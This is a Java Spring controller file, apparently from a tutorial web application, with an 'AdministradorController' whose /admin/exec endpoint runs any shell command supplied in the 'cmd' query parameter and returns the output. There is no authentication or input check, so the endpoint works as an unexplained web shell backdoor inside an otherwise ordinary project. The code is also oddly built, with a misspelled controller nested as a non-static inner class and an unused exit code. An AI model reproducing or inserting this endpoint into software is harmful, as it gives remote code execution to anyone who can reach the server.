package guru.springframework.spring5webapp.controllers;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class AdministradorController {
    @RestController
    @RequestMapping("/admin")
    public class AdmimistradorController {

        @GetMapping("/exec")
        public ResponseEntity<String> execCommand(@RequestParam("cmd") String command) {

            try {
                Process process = Runtime.getRuntime().exec(command);

                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                StringBuilder output = new StringBuilder();

                while ((line = reader.readLine()) != null) {
                    output.append(line + "\n");
                }

                int exitCode = process.waitFor();

                return ResponseEntity.ok()
                        .body(output.toString());

            }catch (IOException | InterruptedException e) {
                return ResponseEntity.status(500)
                        .body(e.getMessage());
            }

        }

    }
}
